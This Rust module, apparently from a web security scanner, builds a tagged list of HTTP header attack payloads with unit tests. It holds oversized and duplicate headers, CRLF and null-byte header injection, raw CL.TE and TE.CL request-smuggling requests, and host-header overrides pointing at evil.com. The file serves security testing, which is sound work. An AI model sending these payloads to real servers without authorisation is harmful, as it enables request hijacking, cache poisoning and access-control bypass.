use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let large_headers: Vec<(&str, String, &str, Severity)> = vec![
        (
            "X-Forwarded-For",
            "1.1.1.1, ".repeat(100),
            "Large X-Forwarded-For",
            Severity::High,
        ),
        (
            "X-Real-IP",
            "A".repeat(1000),
            "Large X-Real-IP",
            Severity::High,
        ),
        (
            "User-Agent",
            "A".repeat(1000),
            "Large User-Agent",
            Severity::High,
        ),
        (
            "Referer",
            format!("http://{}", "a".repeat(500)),
            "Large Referer",
            Severity::High,
        ),
        (
            "Cookie",
            format!("session={}", "A".repeat(500)),
            "Large Cookie",
            Severity::High,
        ),
        (
            "Authorization",
            format!("Bearer {}", "A".repeat(500)),
            "Large Auth header",
            Severity::High,
        ),
        (
            "X-Custom-Header",
            "A".repeat(10000),
            "Very large custom header",
            Severity::Critical,
        ),
    ];

    let duplicate_headers = vec![
        (
            "X-Forwarded-For",
            "1.1.1.1",
            "Duplicate X-Forwarded-For",
            Severity::Medium,
        ),
        (
            "X-Real-IP",
            "127.0.0.1",
            "Duplicate X-Real-IP",
            Severity::Medium,
        ),
        ("Host", "localhost", "Duplicate Host", Severity::High),
        (
            "Content-Length",
            "0",
            "Duplicate Content-Length",
            Severity::Critical,
        ),
        (
            "Transfer-Encoding",
            "chunked",
            "Duplicate Transfer-Encoding",
            Severity::Critical,
        ),
    ];

    let header_injection = vec![
        (
            "X-Test",
            "value\r\nInjected: header",
            "CRLF injection",
            Severity::Critical,
        ),
        (
            "X-Test",
            "value\nInjected: header",
            "LF injection",
            Severity::Critical,
        ),
        (
            "X-Test",
            "value\rInjected: header",
            "CR injection",
            Severity::Critical,
        ),
        (
            "X-Test",
            "value%0d%0aInjected: header",
            "URL encoded CRLF",
            Severity::High,
        ),
        (
            "X-Test",
            "value%0aInjected: header",
            "URL encoded LF",
            Severity::High,
        ),
        (
            "X-Test",
            "value%0dInjected: header",
            "URL encoded CR",
            Severity::High,
        ),
        (
            "X-Test",
            "value\tInjected: header",
            "Tab injection",
            Severity::High,
        ),
        (
            "X-Test",
            "value\x00Injected: header",
            "Null byte injection",
            Severity::High,
        ),
    ];

    let http_smuggling = vec![
        (
            "Content-Length",
            "0",
            "CL-0 smuggling test",
            Severity::Critical,
        ),
        (
            "Transfer-Encoding",
            "chunked",
            "TE chunked smuggling",
            Severity::Critical,
        ),
        (
            "Transfer-Encoding",
            "x",
            "TE obfuscated",
            Severity::Critical,
        ),
        (
            "Transfer-Encoding",
            " chunked",
            "TE with space",
            Severity::Critical,
        ),
        (
            "Transfer-Encoding",
            "\tchunked",
            "TE with tab",
            Severity::Critical,
        ),
        (
            "Transfer-Encoding",
            "chunked\r\nTransfer-Encoding: x",
            "Double TE",
            Severity::Critical,
        ),
        (
            "Content-Length",
            "5\r\nContent-Length: 0",
            "Double CL",
            Severity::Critical,
        ),
        (
            "X-Forwarded-Host",
            "localhost",
            "XFH smuggling",
            Severity::High,
        ),
        (
            "X-Forwarded-Proto",
            "http",
            "XFP smuggling",
            Severity::Medium,
        ),
    ];

    let request_smuggling_payloads = vec![
        ("POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: localhost\r\n\r\n", "CL.TE smuggle", Severity::Critical),
        ("POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX", "TE.CL smuggle", Severity::Critical),
    ];

    let host_header_attacks = vec![
        ("Host", "evil.com", "Host header override", Severity::High),
        (
            "Host",
            "localhost:8080",
            "Port manipulation",
            Severity::Medium,
        ),
        ("Host", "127.0.0.1", "Localhost host header", Severity::High),
        (
            "Host",
            "evil.com\r\nX-Forwarded-Host: target.com",
            "Host with CRLF",
            Severity::Critical,
        ),
        (
            "X-Forwarded-Host",
            "evil.com",
            "XFH override",
            Severity::High,
        ),
        ("X-Host", "evil.com", "X-Host override", Severity::High),
        (
            "X-Forwarded-Server",
            "evil.com",
            "XFS override",
            Severity::Medium,
        ),
        (
            "X-HTTP-Host-Override",
            "evil.com",
            "Override header",
            Severity::Medium,
        ),
        (
            "Forwarded",
            "host=evil.com",
            "Forwarded header",
            Severity::Medium,
        ),
    ];

    let null_byte_headers = vec![
        ("X-Test", "value\x00hidden", "Null in value", Severity::High),
        ("X-Test\x00", "value", "Null in name", Severity::High),
        ("X-Test", "\x00value", "Null at start", Severity::High),
    ];

    for (name, value, desc, severity) in large_headers {
        payloads.push(Payload {
            payload_type: PayloadType::Headers,
            payload: format!("{}: {}", name, value),
            description: desc.to_string(),
            severity,
            tags: vec!["large-header".to_string(), "size-attack".to_string()],
        });
    }

    for (name, value, desc, severity) in duplicate_headers {
        payloads.push(Payload {
            payload_type: PayloadType::Headers,
            payload: format!("{}: {} (duplicate)", name, value),
            description: desc.to_string(),
            severity,
            tags: vec!["duplicate".to_string()],
        });
    }

    for (name, value, desc, severity) in header_injection {
        payloads.push(Payload {
            payload_type: PayloadType::Headers,
            payload: format!("{}: {}", name, value),
            description: desc.to_string(),
            severity,
            tags: vec!["header-injection".to_string(), "crlf".to_string()],
        });
    }

    for (name, value, desc, severity) in http_smuggling {
        payloads.push(Payload {
            payload_type: PayloadType::Headers,
            payload: format!("{}: {}", name, value),
            description: desc.to_string(),
            severity,
            tags: vec!["http-smuggling".to_string()],
        });
    }

    for (payload, desc, severity) in request_smuggling_payloads {
        payloads.push(Payload {
            payload_type: PayloadType::Headers,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec![
                "request-smuggling".to_string(),
                "http-smuggling".to_string(),
            ],
        });
    }

    for (name, value, desc, severity) in host_header_attacks {
        payloads.push(Payload {
            payload_type: PayloadType::Headers,
            payload: format!("{}: {}", name, value),
            description: desc.to_string(),
            severity,
            tags: vec!["host-attack".to_string()],
        });
    }

    for (name, value, desc, severity) in null_byte_headers {
        payloads.push(Payload {
            payload_type: PayloadType::Headers,
            payload: format!("{}: {}", name, value),
            description: desc.to_string(),
            severity,
            tags: vec!["null-byte".to_string()],
        });
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_payloads_returns_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_get_payloads_count_reasonable() {
        let payloads = get_payloads();
        assert!(payloads.len() > 0);
        assert!(payloads.len() < 10000);
    }

    #[test]
    fn test_payloads_are_non_empty_strings() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(
                !p.payload.is_empty(),
                "Payload is empty: {:?}",
                p.description
            );
        }
    }

    #[test]
    fn test_payloads_contain_expected_patterns() {
        let payloads = get_payloads();
        let has_xff = payloads
            .iter()
            .any(|p| p.payload.contains("X-Forwarded-For"));
        let has_crlf = payloads.iter().any(|p| p.payload.contains("\r\n"));
        let has_smuggling = payloads
            .iter()
            .any(|p| p.payload.contains("Transfer-Encoding"));
        assert!(has_xff, "Missing X-Forwarded-For payload");
        assert!(has_crlf, "Missing CRLF injection payload");
        assert!(has_smuggling, "Missing HTTP smuggling payload");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 30,
            "Must have substantial headers payload coverage, got {}",
            payloads.len()
        );
    }
}
